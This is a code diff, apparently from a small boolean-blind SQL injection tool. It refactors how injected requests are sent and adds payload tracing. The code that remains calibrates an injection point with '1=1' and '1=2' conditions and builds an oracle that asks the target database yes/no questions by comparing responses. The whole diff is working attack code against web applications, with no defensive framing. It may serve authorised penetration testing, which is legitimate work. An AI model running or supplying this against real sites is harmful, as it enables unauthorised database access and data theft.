@@ -11,11 +11,7 @@ Dependency-free (urllib). Boolean-blind only for now (the most universal case).
 from __future__ import annotations
 
 import difflib
-import urllib.error
-import urllib.request
 from urllib.parse import parse_qs, urlencode, urlsplit, urlunsplit
-
-_UA = "hickok-sql/0.1"
 
 # Injection contexts: how to wrap an arbitrary boolean condition C around the
 # parameter's normal value V. The right one is found by calibration.
@@ -98,34 +94,33 @@ _PROFILES = {
 }
 
 
-def _fetch(url: str, param: str, value: str, timeout: float = 15.0) -> str:
+def _inject(http, url: str, param: str, value: str) -> str:
     """Send the request with `param` set to `value`; return the response body."""
     parts = urlsplit(url)
     q = {k: v[0] for k, v in parse_qs(parts.query, keep_blank_values=True).items()}
     q[param] = value
-    target = urlunsplit(parts._replace(query=urlencode(q)))
-    req = urllib.request.Request(target, headers={"User-Agent": _UA})
-    try:
-        with urllib.request.urlopen(req, timeout=timeout) as r:
-            return r.read(200_000).decode("utf-8", "ignore")
-    except urllib.error.HTTPError as exc:           # 4xx/5xx still carry a body
-        return exc.read(200_000).decode("utf-8", "ignore")
-    except Exception:
-        return ""
+    return http.get(urlunsplit(parts._replace(query=urlencode(q))))
 
 
 class Oracle:
     """A yes/no question to the database: ask(condition) -> True/False."""
 
-    def __init__(self, url, param, value, template, context, true_text, false_text):
+    def __init__(self, http, url, param, value, template, context, true_text, false_text, console=None):
+        self.http = http
         self.url, self.param, self.value = url, param, value
         self.template, self.context = template, context
         self._true, self._false = true_text, false_text
-        self.count = 0
+        self.console = console
+
+    @property
+    def count(self):
+        return self.http.count
 
     def ask(self, condition: str) -> bool:
-        self.count += 1
-        body = _fetch(self.url, self.param, self.template.format(v=self.value, c=condition))
+        payload = self.template.format(v=self.value, c=condition)
+        if self.console is not None and self.console.verbose >= 2:
+            self.console.trace(f"{self.param}={payload}", level=2)
+        body = _inject(self.http, self.url, self.param, payload)
         return (difflib.SequenceMatcher(None, body, self._true).ratio()
                 >= difflib.SequenceMatcher(None, body, self._false).ratio())
 
@@ -134,13 +129,13 @@ def _sim(a, b):
     return difflib.SequenceMatcher(None, a, b).ratio()
 
 
-def calibrate(url, param, value):
+def calibrate(http, url, param, value, console=None):
     """Find an injection context where TRUE and FALSE give different responses."""
     for context, tmpl in _CONTEXTS:
-        t = _fetch(url, param, tmpl.format(v=value, c="1=1"))
-        f = _fetch(url, param, tmpl.format(v=value, c="1=2"))
+        t = _inject(http, url, param, tmpl.format(v=value, c="1=1"))
+        f = _inject(http, url, param, tmpl.format(v=value, c="1=2"))
         if t and _sim(t, f) < 0.95:                 # the condition visibly moves the page
-            o = Oracle(url, param, value, tmpl, context, t, f)
+            o = Oracle(http, url, param, value, tmpl, context, t, f, console)
             if o.ask("1=1") and not o.ask("1=2"):   # confirm the oracle is consistent
                 return o
     return None
